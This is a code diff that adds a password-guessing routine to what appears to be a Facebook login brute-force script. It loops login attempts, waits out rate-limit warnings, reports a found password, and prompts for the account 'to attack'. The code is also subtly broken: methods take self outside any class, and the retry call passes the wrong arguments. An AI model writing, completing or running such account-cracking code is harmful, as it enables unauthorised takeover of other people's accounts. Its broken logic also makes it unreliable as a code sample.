@@ -31,7 +31,19 @@ def send_login(self, email, password):
     self.browser.form['pass'] = password
     return self.browser.submit().read()
 
+def try_password(self, email, password):
+    print ('Trying %s' % password)
+    data = self.send_login(email, password)
+
+    if self.is_too_often(data):
+        print ('Facebook says we\'re trying too often. Waiting 30 seconds.')
+        sleep(30)
+        self.try_password(password)
+
+    if self.is_logged_in(data):
+        print ('Password found: %s' % password )
+        sys.exit()
 
 email = input('Email address or username to attack:')
 password = input('Password:')
-self.try
+self.try_password(email, password)
